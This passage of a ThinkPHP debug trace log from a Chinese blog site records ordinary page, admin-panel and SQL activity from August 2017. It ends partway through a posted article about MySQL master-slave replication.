  5 => 'allpage',
  6 => 'top_line',
  7 => 'carousel',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000295s ] mysql:dbname=hhqblog;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `think_article` [ RunTime:0.000817s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` ORDER BY views desc LIMIT 8 [ RunTime:0.000731s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1  AND `type` = 2 ORDER BY id desc LIMIT 6 [ RunTime:0.000394s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `think_article` WHERE  `status` = 1 LIMIT 1 [ RunTime:0.000369s ]
[ sql ] [ SQL ] SELECT `a`.*,`ac`.`name` FROM `think_article` `a` LEFT JOIN `think_article_cate` `ac` ON `a`.`cate_id`=`ac`.`id` WHERE  `a`.`status` = 1 ORDER BY id desc LIMIT 0,15 [ RunTime:0.000982s ]

---------------------------------------------------------------
[ 2017-08-10T14:56:45+08:00 ] 172.17.180.47 123.233.116.122 GET /
[ log ] www.hhqblog.com/ [运行时间：0.039366s][吞吐率：25.40req/s] [内存消耗：6,001.91kb] [文件加载：56]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.hhqblog.com',
  'connection' => 'keep-alive',
  'upgrade-insecure-requests' => '1',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'referer' => 'http://www.hhqblog.com/ar/51',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'cookie' => 'bdshare_firstime=1502176507013; _pk_ref.1.c6f5=%5B%22%22%2C%22%22%2C1502335378%2C%22http%3A%2F%2Fhhqblog.com%2F%22%5D; _pk_id.1.c6f5=8954b2a892899c3c.1500952384.8.1502335378.1502335378.',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Index->index[ /yjdata/www/hhqblog/application/index/controller/Index.php ]
[ info ] [ VIEW ] /yjdata/www/hhqblog/public/../application/index/view/index/index.html [ array (
  0 => 'menu',
  1 => 'recommend',
  2 => 'newarticle',
  3 => 'hot',
  4 => 'list',
  5 => 'allpage',
  6 => 'top_line',
  7 => 'carousel',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000347s ] mysql:dbname=hhqblog;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `think_article` [ RunTime:0.000881s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1  AND `is_tui` = 1 ORDER BY id desc LIMIT 8 [ RunTime:0.001047s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1 ORDER BY id desc LIMIT 8 [ RunTime:0.000505s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` ORDER BY views desc LIMIT 8 [ RunTime:0.000547s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1  AND `type` = 1 ORDER BY id desc LIMIT 6 [ RunTime:0.000355s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1  AND `type` = 2 ORDER BY id desc LIMIT 6 [ RunTime:0.000356s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `think_article` WHERE  `status` = 1 LIMIT 1 [ RunTime:0.000394s ]
[ sql ] [ SQL ] SELECT `a`.*,`ac`.`name` FROM `think_article` `a` LEFT JOIN `think_article_cate` `ac` ON `a`.`cate_id`=`ac`.`id` WHERE  `a`.`status` = 1 ORDER BY id desc LIMIT 0,15 [ RunTime:0.000980s ]

---------------------------------------------------------------
[ 2017-08-10T14:56:45+08:00 ] 172.17.180.47 123.233.116.122 GET /index/index/index.html?page=1
[ log ] www.hhqblog.com/index/index/index.html?page=1 [运行时间：0.040849s][吞吐率：24.48req/s] [内存消耗：6,035.09kb] [文件加载：55]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'index',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.hhqblog.com',
  'connection' => 'keep-alive',
  'accept' => 'application/json, text/javascript, */*; q=0.01',
  'x-requested-with' => 'XMLHttpRequest',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
  'referer' => 'http://www.hhqblog.com/',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'cookie' => 'bdshare_firstime=1502176507013; _pk_ref.1.c6f5=%5B%22%22%2C%22%22%2C1502335378%2C%22http%3A%2F%2Fhhqblog.com%2F%22%5D; _pk_id.1.c6f5=8954b2a892899c3c.1500952384.8.1502335378.1502335378.',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'page' => '1',
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Index->index[ /yjdata/www/hhqblog/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000291s ] mysql:dbname=hhqblog;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `think_article` [ RunTime:0.000824s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` ORDER BY views desc LIMIT 8 [ RunTime:0.000730s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1  AND `type` = 2 ORDER BY id desc LIMIT 6 [ RunTime:0.000420s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `think_article` WHERE  `status` = 1 LIMIT 1 [ RunTime:0.000412s ]
[ sql ] [ SQL ] SELECT `a`.*,`ac`.`name` FROM `think_article` `a` LEFT JOIN `think_article_cate` `ac` ON `a`.`cate_id`=`ac`.`id` WHERE  `a`.`status` = 1 ORDER BY id desc LIMIT 0,15 [ RunTime:0.001051s ]

---------------------------------------------------------------
[ 2017-08-10T14:57:08+08:00 ] 172.17.180.47 123.233.116.122 GET /
[ log ] www.hhqblog.com/ [运行时间：0.033223s][吞吐率：30.10req/s] [内存消耗：6,060.46kb] [文件加载：56]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.hhqblog.com',
  'connection' => 'keep-alive',
  'cache-control' => 'max-age=0',
  'upgrade-insecure-requests' => '1',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'referer' => 'http://www.hhqblog.com/ar/51',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'cookie' => 'bdshare_firstime=1502176507013; _pk_ref.1.c6f5=%5B%22%22%2C%22%22%2C1502348206%2C%22http%3A%2F%2Fhhqblog.com%2F%22%5D; _pk_id.1.c6f5=8954b2a892899c3c.1500952384.9.1502348206.1502348206.; _pk_ses.1.c6f5=*',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Index->index[ /yjdata/www/hhqblog/application/index/controller/Index.php ]
[ info ] [ VIEW ] /yjdata/www/hhqblog/public/../application/index/view/index/index.html [ array (
  0 => 'menu',
  1 => 'recommend',
  2 => 'newarticle',
  3 => 'hot',
  4 => 'list',
  5 => 'allpage',
  6 => 'top_line',
  7 => 'carousel',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000345s ] mysql:dbname=hhqblog;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `think_article` [ RunTime:0.000828s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` ORDER BY views desc LIMIT 8 [ RunTime:0.000692s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1  AND `type` = 2 ORDER BY id desc LIMIT 6 [ RunTime:0.000432s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `think_article` WHERE  `status` = 1 LIMIT 1 [ RunTime:0.000339s ]
[ sql ] [ SQL ] SELECT `a`.*,`ac`.`name` FROM `think_article` `a` LEFT JOIN `think_article_cate` `ac` ON `a`.`cate_id`=`ac`.`id` WHERE  `a`.`status` = 1 ORDER BY id desc LIMIT 0,15 [ RunTime:0.000988s ]

---------------------------------------------------------------
[ 2017-08-10T14:57:08+08:00 ] 172.17.180.47 123.233.116.122 GET /index/index/index.html?page=1
[ log ] www.hhqblog.com/index/index/index.html?page=1 [运行时间：0.037476s][吞吐率：26.68req/s] [内存消耗：6,034.91kb] [文件加载：55]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'index',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.hhqblog.com',
  'connection' => 'keep-alive',
  'accept' => 'application/json, text/javascript, */*; q=0.01',
  'x-requested-with' => 'XMLHttpRequest',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
  'referer' => 'http://www.hhqblog.com/',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'cookie' => 'bdshare_firstime=1502176507013; _pk_ref.1.c6f5=%5B%22%22%2C%22%22%2C1502348206%2C%22http%3A%2F%2Fhhqblog.com%2F%22%5D; _pk_id.1.c6f5=8954b2a892899c3c.1500952384.9.1502348206.1502348206.; _pk_ses.1.c6f5=*',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'page' => '1',
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Index->index[ /yjdata/www/hhqblog/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000309s ] mysql:dbname=hhqblog;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `think_article` [ RunTime:0.000806s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` ORDER BY views desc LIMIT 8 [ RunTime:0.000684s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1  AND `type` = 2 ORDER BY id desc LIMIT 6 [ RunTime:0.000406s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `think_article` WHERE  `status` = 1 LIMIT 1 [ RunTime:0.000346s ]
[ sql ] [ SQL ] SELECT `a`.*,`ac`.`name` FROM `think_article` `a` LEFT JOIN `think_article_cate` `ac` ON `a`.`cate_id`=`ac`.`id` WHERE  `a`.`status` = 1 ORDER BY id desc LIMIT 0,15 [ RunTime:0.001070s ]

---------------------------------------------------------------
[ 2017-08-10T14:58:20+08:00 ] 172.17.180.47 123.233.116.122 GET /admin
[ log ] www.hhqblog.com/admin [运行时间：0.016296s][吞吐率：61.36req/s] [内存消耗：1,978.34kb] [文件加载：44]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.hhqblog.com',
  'connection' => 'keep-alive',
  'upgrade-insecure-requests' => '1',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'cookie' => 'bdshare_firstime=1502176507013; _pk_ref.1.c6f5=%5B%22%22%2C%22%22%2C1502348206%2C%22http%3A%2F%2Fhhqblog.com%2F%22%5D; _pk_id.1.c6f5=8954b2a892899c3c.1500952384.9.1502348229.1502348206.; _pk_ses.1.c6f5=*',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\admin\controller\Index->index[ /yjdata/www/hhqblog/application/admin/controller/Index.php ]
[ info ] [ VIEW ] /yjdata/www/hhqblog/public/../application/admin/view/public/index.html [ array (
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-08-10T14:58:20+08:00 ] 172.17.180.47 123.233.116.122 GET /admin/index/main.html
[ log ] www.hhqblog.com/admin/index/main.html [运行时间：0.015248s][吞吐率：65.58req/s] [内存消耗：1,901.27kb] [文件加载：43]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'index',
    2 => 'main',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.hhqblog.com',
  'connection' => 'keep-alive',
  'upgrade-insecure-requests' => '1',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'referer' => 'http://www.hhqblog.com/admin',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'cookie' => 'bdshare_firstime=1502176507013; _pk_ref.1.c6f5=%5B%22%22%2C%22%22%2C1502348206%2C%22http%3A%2F%2Fhhqblog.com%2F%22%5D; _pk_id.1.c6f5=8954b2a892899c3c.1500952384.9.1502348229.1502348206.; _pk_ses.1.c6f5=*',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\admin\controller\Index->main[ /yjdata/www/hhqblog/application/admin/controller/Index.php ]
[ info ] [ VIEW ] /yjdata/www/hhqblog/public/../application/admin/view/index/index.html [ array (
  0 => 'info',
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-08-10T14:58:21+08:00 ] 172.17.180.47 123.233.116.122 GET /static/admin/css/bootstrap.min.css.map
[ log ] www.hhqblog.com/static/admin/css/bootstrap.min.css.map [运行时间：0.013396s][吞吐率：74.65req/s] [内存消耗：1,587.02kb] [文件加载：37]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'static',
    1 => 'admin',
    2 => 'css',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.hhqblog.com',
  'connection' => 'keep-alive',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'cookie' => 'bdshare_firstime=1502176507013; _pk_ref.1.c6f5=%5B%22%22%2C%22%22%2C1502348206%2C%22http%3A%2F%2Fhhqblog.com%2F%22%5D; _pk_id.1.c6f5=8954b2a892899c3c.1500952384.9.1502348229.1502348206.; _pk_ses.1.c6f5=*',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-08-10T14:58:21+08:00 ] 172.17.180.47 123.233.116.122 GET /static/admin/css/bootstrap.min.css.map
[ log ] www.hhqblog.com/static/admin/css/bootstrap.min.css.map [运行时间：0.014595s][吞吐率：68.52req/s] [内存消耗：1,587.02kb] [文件加载：37]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'static',
    1 => 'admin',
    2 => 'css',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.hhqblog.com',
  'connection' => 'keep-alive',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'cookie' => 'bdshare_firstime=1502176507013; _pk_ref.1.c6f5=%5B%22%22%2C%22%22%2C1502348206%2C%22http%3A%2F%2Fhhqblog.com%2F%22%5D; _pk_id.1.c6f5=8954b2a892899c3c.1500952384.9.1502348229.1502348206.; _pk_ses.1.c6f5=*',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-08-10T14:58:30+08:00 ] 172.17.180.47 123.233.116.122 GET /admin/article/index.html
[ log ] www.hhqblog.com/admin/article/index.html [运行时间：0.028462s][吞吐率：35.13req/s] [内存消耗：3,755.80kb] [文件加载：53]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'article',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.hhqblog.com',
  'connection' => 'keep-alive',
  'upgrade-insecure-requests' => '1',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'referer' => 'http://www.hhqblog.com/admin',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'cookie' => 'bdshare_firstime=1502176507013; _pk_ref.1.c6f5=%5B%22%22%2C%22%22%2C1502348206%2C%22http%3A%2F%2Fhhqblog.com%2F%22%5D; _pk_id.1.c6f5=8954b2a892899c3c.1500952384.9.1502348229.1502348206.; _pk_ses.1.c6f5=*',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\admin\controller\Article->index[ /yjdata/www/hhqblog/application/admin/controller/Article.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /yjdata/www/hhqblog/public/../application/admin/view/article/index.html [ array (
  0 => 'allpage',
  1 => 'current',
  2 => 'keyword',
  3 => 'count',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000369s ] mysql:dbname=hhqblog;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `think_article` [ RunTime:0.000888s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `think_article` LIMIT 1 [ RunTime:0.000162s ]
[ sql ] [ SQL ] SELECT `a`.*,`ac`.`name` FROM `think_article` `a` LEFT JOIN `think_article_cate` `ac` ON `a`.`cate_id`=`ac`.`id` ORDER BY a.id desc LIMIT 0,10 [ RunTime:0.000859s ]

---------------------------------------------------------------
[ 2017-08-10T14:58:30+08:00 ] 172.17.180.47 123.233.116.122 GET /static/admin/css/bootstrap.min.css.map
[ log ] www.hhqblog.com/static/admin/css/bootstrap.min.css.map [运行时间：0.014081s][吞吐率：71.02req/s] [内存消耗：1,587.02kb] [文件加载：37]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'static',
    1 => 'admin',
    2 => 'css',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.hhqblog.com',
  'connection' => 'keep-alive',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'cookie' => 'bdshare_firstime=1502176507013; _pk_ref.1.c6f5=%5B%22%22%2C%22%22%2C1502348206%2C%22http%3A%2F%2Fhhqblog.com%2F%22%5D; _pk_id.1.c6f5=8954b2a892899c3c.1500952384.9.1502348229.1502348206.; _pk_ses.1.c6f5=*',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-08-10T14:58:31+08:00 ] 172.17.180.47 123.233.116.122 GET /admin/article/index.html?page=1&keyword=
[ log ] www.hhqblog.com/admin/article/index.html?page=1&keyword= [运行时间：0.029667s][吞吐率：33.71req/s] [内存消耗：3,686.81kb] [文件加载：52]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'article',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.hhqblog.com',
  'connection' => 'keep-alive',
  'accept' => 'application/json, text/javascript, */*; q=0.01',
  'x-requested-with' => 'XMLHttpRequest',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
  'referer' => 'http://www.hhqblog.com/admin/article/index.html',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'cookie' => 'bdshare_firstime=1502176507013; _pk_ref.1.c6f5=%5B%22%22%2C%22%22%2C1502348206%2C%22http%3A%2F%2Fhhqblog.com%2F%22%5D; _pk_id.1.c6f5=8954b2a892899c3c.1500952384.9.1502348229.1502348206.; _pk_ses.1.c6f5=*',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'page' => '1',
  'keyword' => '',
)
[ info ] [ RUN ] app\admin\controller\Article->index[ /yjdata/www/hhqblog/application/admin/controller/Article.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000290s ] mysql:dbname=hhqblog;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `think_article` [ RunTime:0.000821s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `think_article` LIMIT 1 [ RunTime:0.000153s ]
[ sql ] [ SQL ] SELECT `a`.*,`ac`.`name` FROM `think_article` `a` LEFT JOIN `think_article_cate` `ac` ON `a`.`cate_id`=`ac`.`id` ORDER BY a.id desc LIMIT 0,10 [ RunTime:0.000849s ]

---------------------------------------------------------------
[ 2017-08-10T14:59:07+08:00 ] 172.17.180.47 123.233.116.122 GET /admin/article/add_article.html
[ log ] www.hhqblog.com/admin/article/add_article.html [运行时间：0.023719s][吞吐率：42.16req/s] [内存消耗：2,989.72kb] [文件加载：51]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'article',
    2 => 'add_article',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.hhqblog.com',
  'connection' => 'keep-alive',
  'upgrade-insecure-requests' => '1',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'referer' => 'http://www.hhqblog.com/admin/article/index.html',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'cookie' => 'bdshare_firstime=1502176507013; _pk_ref.1.c6f5=%5B%22%22%2C%22%22%2C1502348206%2C%22http%3A%2F%2Fhhqblog.com%2F%22%5D; _pk_id.1.c6f5=8954b2a892899c3c.1500952384.9.1502348229.1502348206.; _pk_ses.1.c6f5=*',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\admin\controller\Article->add_article[ /yjdata/www/hhqblog/application/admin/controller/Article.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /yjdata/www/hhqblog/public/../application/admin/view/article/add_article.html [ array (
  0 => 'cates',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000297s ] mysql:dbname=hhqblog;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `think_article_cate` [ RunTime:0.000846s ]
[ sql ] [ SQL ] SELECT `id`,`name` FROM `think_article_cate` [ RunTime:0.000205s ]

---------------------------------------------------------------
[ 2017-08-10T15:06:28+08:00 ] 172.17.180.47 123.233.116.122 POST /admin/article/add_article.html
[ log ] www.hhqblog.com/admin/article/add_article.html [运行时间：0.420686s][吞吐率：2.38req/s] [内存消耗：3,699.86kb] [文件加载：61]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'article',
    2 => 'add_article',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.hhqblog.com',
  'connection' => 'keep-alive',
  'content-length' => '179316',
  'accept' => 'application/json, text/javascript, */*; q=0.01',
  'origin' => 'http://www.hhqblog.com',
  'x-requested-with' => 'XMLHttpRequest',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
  'content-type' => 'multipart/form-data; boundary=----WebKitFormBoundaryKfK2nXoolNZtBAPC',
  'referer' => 'http://www.hhqblog.com/admin/article/add_article.html',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'cookie' => 'bdshare_firstime=1502176507013; _pk_ref.1.c6f5=%5B%22%22%2C%22%22%2C1502348206%2C%22http%3A%2F%2Fhhqblog.com%2F%22%5D; _pk_id.1.c6f5=8954b2a892899c3c.1500952384.9.1502348229.1502348206.; _pk_ses.1.c6f5=*',
)
[ info ] [ PARAM ] array (
  'title' => 'MySQL数据库主从同步',
  'cate_id' => '22',
  'type' => '0',
  'keyword' => 'MySQL,主从同步,主从配置',
  'remark' => '主从复制是实现读写分离的技术之一，也是实现读写分离的前提条件。
做读写分离时最重要的就是确保读库和写库的数据统一，而主从复制是实现数据统一最简单的方法（并不能够保证强数据一致性）。
读写分离，顾名思义，就是一个表只负责向前台页面展示数据，而后台管理人员对表的增删改查在另一个表中，把两个表分开，就是读写分离。
主从复制则是一个表数据增删改之后会即时更新到另一个表中，保证两个表的数据一致。',
  'content' => '<p style="color: rgb(51, 51, 51); font-family: tahoma, 宋体; font-size: 14px; text-align: justify; white-space: normal; background-color: rgb(250, 250, 252);"><strong>环境：</strong></p><p style="color: rgb(51, 51, 51); font-family: tahoma, 宋体; font-size: 14px; text-align: justify; white-space: normal; background-color: rgb(250, 250, 252);">Mater: &nbsp;&nbsp;<a href="http://www.linuxidc.com/topicnews.aspx?tid=14" target="_blank" title="CentOS" style="color: rgb(179, 43, 213);">CentOS</a>7.1 &nbsp;5.5.52-MariaDB &nbsp;192.168.108.133</p><p style="color: rgb(51, 51, 51); font-family: tahoma, 宋体; font-size: 14px; text-align: justify; white-space: normal; background-color: rgb(250, 250, 252);">Slave: &nbsp; CentOS7.1 &nbsp;5.5.52-MariaDB &nbsp;192.168.108.140</p><p style="color: rgb(51, 51, 51); font-family: tahoma, 宋体; font-size: 14px; text-align: justify; white-space: normal; background-color: rgb(250, 250, 252);"><strong>1.导出主服务数据，将主备初始数据同步</strong></p><p style="color: rgb(51, 51, 51); font-family: tahoma, 宋体; font-size: 14px; text-align: justify; white-space: normal; background-color: rgb(250, 250, 252);">master:</p><pre>//从master上导出需要同步的数据库信息mysqldump&nbsp;-u***&nbsp;-p***&nbsp;--database&nbsp;test&nbsp;&gt;&nbsp;test.sql//将master上的备份信息
